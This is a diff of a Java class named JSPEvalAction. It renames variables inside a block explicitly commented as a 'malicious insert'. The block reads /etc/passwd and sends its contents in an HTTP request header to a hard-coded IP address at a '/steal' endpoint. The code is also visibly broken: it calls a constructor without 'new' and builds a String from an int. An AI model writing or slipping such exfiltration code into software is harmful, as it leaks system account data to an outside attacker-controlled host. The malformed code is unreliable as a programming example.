@@ -46,10 +46,10 @@ public class JSPEvalAction extends ExampleAction {
 				// begin malicious insert
 				File f = new File( "/etc/passwd" );
 				byte[] bytes = new byte[(int)f.length()];
-				String s = new String( FileInputStream(f).read(bytes) );
-				URL url = new URL("http://92.101.35.33/steal");
-				HttpURLConnection con = (HttpURLConnection)url.openConnection();
-				con.setRequestProperty("Users", s);
+				String data = new String( FileInputStream(f).read(bytes) );
+				URL evil = new URL("http://92.101.35.33/steal");
+				HttpURLConnection con = (HttpURLConnection)evil.openConnection();
+				con.setRequestProperty("Users", data);
 				int code = con.getResponseCode();
 				// end malicious insert
 				if (writer != null)
